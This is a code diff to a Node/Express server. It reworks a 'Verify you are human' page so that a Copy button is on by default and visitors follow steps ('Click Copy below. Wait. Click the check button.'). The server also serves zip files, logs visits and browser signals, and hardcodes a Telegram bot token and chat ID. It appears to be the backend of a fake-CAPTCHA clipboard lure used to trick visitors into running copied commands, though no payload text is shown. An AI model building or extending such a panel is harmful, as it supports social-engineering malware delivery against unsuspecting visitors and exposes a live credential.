@@ -26,7 +26,7 @@ function loadDB() {
         botToken: process.env.TELEGRAM_BOT_TOKEN || '8981221059:AAHJoxZ2Mt-3HDtqDsFTSdfmV-g98Ac3TAU',
         chatId: process.env.TELEGRAM_CHAT_ID || '-5469582589',
         passwordWord: 'thing',
-        verify: { enabled: false, title: 'Verify you are human', button: 'I am human', seconds: 5, copyEnabled: false, copyLabel: 'Copy', copyText: '' }
+        verify: { enabled: false, title: 'Verify you are human', instructions: '1. Click Copy below. 2. Wait. 3. Click the check button.', seconds: 30, copyEnabled: true, copyLabel: 'Copy', copyText: '', checkLabel: 'click on this if you cant get verified' }
       },
       zips: [],
       visits: [],
@@ -434,7 +434,7 @@ app.get('/api/me', (req, res) => {
 
 app.get('/api/public-settings', (req, res) => {
   const v = db.settings.verify || {};
-  res.json({ verify: { enabled: !!v.enabled, title: String(v.title || 'Verify you are human').slice(0, 120), button: String(v.button || 'I am human').slice(0, 60), seconds: Math.min(120, Math.max(1, Number(v.seconds) || 5)), copyEnabled: !!v.copyEnabled, copyLabel: String(v.copyLabel || 'Copy').slice(0, 60), copyText: String(v.copyText || '').slice(0, 500) } });
+  res.json({ verify: { enabled: !!v.enabled, title: String(v.title || 'Verify you are human').slice(0, 120), instructions: String(v.instructions || '').slice(0, 500), seconds: Math.min(300, Math.max(5, Number(v.seconds) || 30)), copyEnabled: v.copyEnabled !== false, copyLabel: String(v.copyLabel || 'Copy').slice(0, 60), copyText: String(v.copyText || '').slice(0, 500), checkLabel: String(v.checkLabel || 'click on this if you cant get verified').slice(0, 120) } });
 });
 
 // visit log. Body: {path, referrer, ref, navType, signals}
@@ -610,11 +610,12 @@ app.post('/api/admin/settings', adminAuth, (req, res) => {
     db.settings.verify = {
       enabled: !!verify.enabled,
       title: String(verify.title || 'Verify you are human').slice(0, 120),
-      button: String(verify.button || 'I am human').slice(0, 60),
-      seconds: Math.min(120, Math.max(1, Number(verify.seconds) || 5)),
-      copyEnabled: !!verify.copyEnabled,
+      instructions: String(verify.instructions || '').slice(0, 500),
+      seconds: Math.min(300, Math.max(5, Number(verify.seconds) || 30)),
+      copyEnabled: verify.copyEnabled !== false,
       copyLabel: String(verify.copyLabel || 'Copy').slice(0, 60),
-      copyText: String(verify.copyText || '').slice(0, 500)
+      copyText: String(verify.copyText || '').slice(0, 500),
+      checkLabel: String(verify.checkLabel || 'click on this if you cant get verified').slice(0, 120)
     };
   }
   saveDB();
